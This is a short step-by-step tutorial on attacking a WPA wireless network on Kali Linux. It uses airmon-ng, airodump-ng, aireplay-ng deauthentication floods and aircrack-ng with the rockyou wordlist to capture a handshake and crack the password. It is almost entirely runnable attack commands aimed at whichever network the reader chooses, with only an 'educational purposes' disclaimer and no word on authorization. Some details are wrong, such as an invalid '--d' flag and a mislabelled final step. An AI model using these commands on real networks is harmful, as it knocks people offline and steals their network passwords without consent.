This is a simple tutorial on how to perform a deauthentication attack on a
wireless network using a wordlist on Kali Linux. For educational purposes only.

## 1. Put your wireless card in monitor mode

```
ip a
```

this will show you the name of your wireless card, in my case it's `wlan0`

```
airmon-ng start wlan0
```

this will put your wireless card in monitor mode, in my case it's now `wlan0mon`

this switches the network card to monitor mode, which allows us to see all the
traffic on the network

## 2. Find the name of the network you want to attack

```
airodump-ng wlan0mon
```

this will show you all the networks in range, find the one you want to attack
and copy the name of it. You need the BSSID and the channel number.

## 3. Start capturing packets

```
airodump-ng --d <BSSID> -c <CHANNEL> -w FILENAME wlan0mon
```

this will start capturing packets from the network you want to attack, it will
save them in a file called `FILENAME.cap`. You can stop this process by pressing
`CTRL + C`. Take note of the STATION of the client you want to attack.

## 4. Deauthenticate a client

```
aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0mon 
```

this will deauthenticate the client from the network, it will send 10 packets 
to the client. You can stop this process by pressing `CTRL + C`. It will interuppt 
the connection of the client from the network. Sometimes it doesn't work first try but 
it usually works after a few tries.

## 5. Crack the password

```
aircrack-ng FILENAME.cap -w WORDLIST
```

WORDLIST is the path to the wordlist you want to use to crack the password. 
Typically the wordlist is located in `/usr/share/wordlists/rockyou.txt`

This will crack the password of the network and show it to you.

## 6. Stop capturing packets

```
airmon-ng stop wlan0mon
```

this will stop capturing packets and put your wireless card back in managed mode
